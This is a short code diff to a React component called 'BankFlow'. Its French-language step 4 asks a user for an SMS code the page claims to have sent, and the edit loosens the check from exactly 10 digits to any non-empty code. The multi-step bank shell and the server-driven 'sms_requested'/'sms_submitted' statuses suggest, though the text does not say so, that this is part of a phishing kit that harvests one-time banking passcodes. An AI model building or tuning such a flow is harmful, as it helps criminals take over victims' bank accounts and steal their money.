@@ -691,9 +691,9 @@ export default function BankFlow() {
 
   /* ---------- SMS ---------- */
   if (status === "sms_requested") {
-    const code = sms.replace(/\D/g, "").slice(0, 10);
-    const err = !t4 ? "" : !code ? "Le code SMS est requis." : code.length !== 10 ? "Le code SMS doit comporter 10 chiffres." : "";
-    const ok = code.length === 10;
+    const code = sms.replace(/\D/g, "").slice(0, 20);
+    const err = !t4 ? "" : !code ? "Le code SMS est requis." : "";
+    const ok = code.length > 0;
     return (
       <Shell bank={bank} step={4} kicker="Vérification SMS" title="Entrez votre code SMS" desc="Veuillez saisir le code SMS que nous venons d'envoyer à votre numéro.">
         <form noValidate onSubmit={(e) => { e.preventDefault(); setT4(true); if (!ok) return; submitAndWait("sms", { sms: code }, "sms_submitted"); }}>
